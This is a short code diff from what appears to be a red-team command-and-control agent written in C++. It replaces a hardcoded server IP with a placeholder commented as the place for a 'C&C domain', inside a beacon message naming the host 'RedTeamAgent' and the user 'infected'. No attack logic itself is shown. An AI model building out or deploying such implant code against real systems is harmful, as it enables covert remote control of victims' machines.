@@ -4,7 +4,6 @@
 #include "main.h"
 
 
-
 string ModuleCommands = "";
 HMODULE Module = NULL;
 int main()
@@ -14,7 +13,7 @@ int main()
     {
         JSON msg = {
                 "pid", "1200",
-                "server", "54.247.53.160",
+                "server", "", // IP Address or C&C domain goes here. 
                 "platform", "windows",
                 "host", "RedTeamAgent",
                 "username", "infected",
